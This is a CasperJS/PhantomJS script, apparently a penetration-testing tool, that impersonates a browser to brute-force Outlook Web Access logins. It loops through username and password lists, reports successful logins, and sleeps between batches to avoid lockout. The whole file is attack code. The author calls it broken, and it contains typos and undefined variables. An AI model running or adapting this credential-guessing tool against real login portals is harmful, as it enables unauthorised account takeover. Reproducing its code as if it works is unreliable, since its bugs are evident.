// casper|phantom JS
// author: mp - heavily based on ry's POC
// this requires casperjs and phantomjs to work sometimes OWA login portals are protected by 
// microsuck forefront to provide cookie auth.. something that is annoying to code for with
// any other language, so impersonate a browser and use that to make guessing attempts :)

// this is currently broken

var casper = require("casper").create({
    verbose      : true,
    pageSettings : {
        loadImages  : false,
        loadPlugins : false,
        javascriptEnabled: true
    },
    viewportSize : {
        width  : 800,
        height : 600
    }
});

var fs    = require("fs");
var utils = require("utils");

var width  = 1920;
var height = 1080;

var failed   = casper.cli.get("failed");
var userid   = casper.cli.get("userid");
var passid   = casper.cli.get("passid");
var url      = casper.cli.get("url");
var title    = casper.cli.get("title");
var form     = casper.cli.get("form");
var UA       = casper.cli.get("user-agent");
var userlist = casper.cli.get("userlist");
var passlist = casper.cli.get("passlist");
var attempts = casper.cli.get("attempts");
var sleep    = casper.cli.get("sleep");
var button   = casper.cli.get("button");

// we need all the options for this to work
if (!failed || !userid || !passid || !url || !title || !UA || 
    !userlist || !passlist || !attempts || !sleep || !button || !form) {
        casper.echo("usage: casperjs owabf.js <args>");
        casper.echo("    --failed     : failed string");
        casper.echo("    --userid     : input id for username field");
        casper.echo("    --passid     : input id for password field");
        casper.echo("    --form       : login form");
        casper.echo("    --url        : location of OWA");
        casper.echo("    --title      : expected title");
        casper.echo("    --user-agent : useragent to use");
        casper.echo("    --userlist   : list of usernames or emails");
        casper.echo("    --passlist   : list of passwords");
        casper.echo("    --attempts   : number of attempts before sleeping");
        casper.echo("    --sleep      : how long to sleep for in minutes");
        casper.echo("    --button     : button text to click");
        casper.exit(1);
}

// HTTP Response code handling
casper.on("resource.request", function(resource) {
    casper.echo("[GET] " + resource.url);
});

casper.on("resource.recieved", function(resource) {
    casper.echo("[RSP] " + resource.url);
});

casper.on("http.status.200", function(resource) {
    casper.echo("[200] " + resource.url + " OK");
});

casper.on("http.status.302", function(resource) {
    casper.echo( "[302] " + resource.url + " Redirect");
});

casper.on("http.status.500", function(resource) {
    capser.echo("[500] " + resource.url + " Internal Error");
});

casper.on("open", function(location) {
  this.echo(location)
});

var users   = fs.open("" + userlist, "r");
var passwds = fs.open("" + passlist, "r");
var count   = 0

casper.userAgent(UA);
casper.echo("[+++] Starting...");

casper.start(url, function() {
    casper.echo("[+++] Targeting " + url);
    casper.echo("[>>>] Found title: " + this.getTitle());
});

casper.then( function() {
    if (users && passwds) {
        passwd = passwds.readLine();
        while(passwd) {
            user = users.readLine();
            while(user) {           
                this.sendKeys('input[id="' + userid + '"]', user);
                this.sendKeys('input[id="' + passid + '"]', passwd);
                this.wait(1000, function() {
                    this.clickLabel('input[value="' + button + '"]');
                    casper.echo("[-*-] Submission");
                });
                casper.then(function() {
                    // wait for the page to load
                    this.wait(1000, function() {
                        if (this.getHTLM().indexOf(failed) == -1) {
                            this.echo("[+++] Successful login " + userlines[j] + ":" + passlines[i]);
                        } else {
                            this.echo("[!!!] Failed login " + userlines[j] + ":" + passlines[i]);
                        }
                    });
                });
                user = users.readLine();
            }
            passwd = passwds.readLine();
            count += 1;
            if (count % attempts == 0) {
                this.echo("[---] Sleeping for " + sleep + " minutes");
                this.wait( sleep * 60000 );
            }
        }
    }
});

casper.run(function() {
    casper.exit();
});
